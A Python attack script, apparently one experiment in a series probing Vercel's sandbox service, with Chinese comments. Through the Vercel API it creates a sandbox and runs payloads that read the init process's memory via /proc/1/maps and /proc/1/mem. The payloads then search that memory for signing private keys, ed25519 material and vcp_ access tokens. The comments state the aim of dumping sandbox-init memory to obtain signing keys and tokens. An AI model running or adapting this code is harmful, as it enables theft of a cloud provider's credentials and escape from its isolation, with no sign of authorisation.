# 实验J187: /proc/1/mem 读取测试 (sandbox-init 内存dump -> 签名私钥/令牌)
# j186: SpawnService路径访问触发服务端杀客户端(签名验证); 30002无响应
# 本步: 1)/proc/1/maps 读内存布局 2)/proc/1/mem 读堆/栈/映射区
#       3)若可读: 搜内存中 vcp_/BEGIN PRIVATE KEY/签名相关数据
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=10000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj187"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# PA: maps + mem 基础测试
PA = r'''
import os, ctypes
out = open("/tmp/d187a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
# 1. maps
try:
    with open("/proc/1/maps") as fh:
        maps = fh.read()
    p("maps_len", len(maps))
    p("MAPS", maps[:2000])
except Exception as ex:
    p("maps_exc", repr(ex))
p("maps_done")
out.flush()
# 2. /proc/1/mem 读测试 (从 maps 找 rw 段)
try:
    fd = os.open("/proc/1/mem", os.O_RDONLY)
    p("mem_open_ok")
    # 尝试读低地址(ELF头) - 需要 lseek
    for addr in [0x400000, 0x8db000, 0xe30000]:
        try:
            r = os.lseek(fd, addr, 0)
            d = os.read(fd, 64)
            p("MEM", hex(addr), "seek", r, "read", len(d), d[:16].hex())
        except Exception as ex:
            p("MEM_EXC", hex(addr), repr(ex))
    os.close(fd)
except Exception as ex:
    p("mem_exc", repr(ex))
p("done")
out.close()
'''

# PB: mem 读取堆区 + 搜索 (若PA成功)
PB = r'''
import os, re
out = open("/tmp/d187b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
try:
    fd = os.open("/proc/1/mem", os.O_RDONLY)
except Exception as ex:
    p("open_exc", repr(ex))
    p("done")
    out.close()
    raise SystemExit
# 从 maps 解析 rw 段 (堆/数据)
try:
    with open("/proc/1/maps") as fh:
        maps = fh.read()
except Exception:
    maps = ""
segs = []
for ln in maps.splitlines():
    parts = ln.split()
    if len(parts) < 2:
        continue
    if parts[1][0] not in "rw":
        continue
    a, b = parts[0].split("-")
    segs.append((int(a, 16), int(b, 16), parts[1], parts[2] if len(parts) > 2 else ""))
p("rwsegs", len(segs))
pats = [b"vcp_", b"BEGIN PRIVATE KEY", b"-----BEGIN", b"ed25519", b"x25519",
        b"signing", b"private key", b"WVN8gckg"]
total = 0
for a, b, perm, name in segs[:20]:
    if b - a > 64 * 1024 * 1024:
        continue
    p("SEG", hex(a), hex(b), perm, name[:40])
    pos = a
    while pos < b:
        try:
            os.lseek(fd, pos, 0)
            d = os.read(fd, 4096)
        except Exception:
            break
        if not d:
            break
        total += len(d)
        for pat in pats:
            idx = d.find(pat)
            if idx >= 0:
                ctx = d[max(0, idx - 20):idx + 80]
                p("HIT", pat.decode(), hex(pos + idx), ctx[:120])
        pos += len(d)
    out.flush()
p("scanned", total)
os.close(fd)
p("done")
out.close()
'''

steps = [
    ("mem-base", "/tmp/d187a.txt", PA),
    ("mem-scan", "/tmp/d187b.txt", PB),
]
for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=280)
    time.sleep(2)
    bashfile(sid, f"cat {marker}", f"marker[{label}]", 10000)
    if st == "DEAD":
        print(f"\n!!! DEATH after cmd[{label}]", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
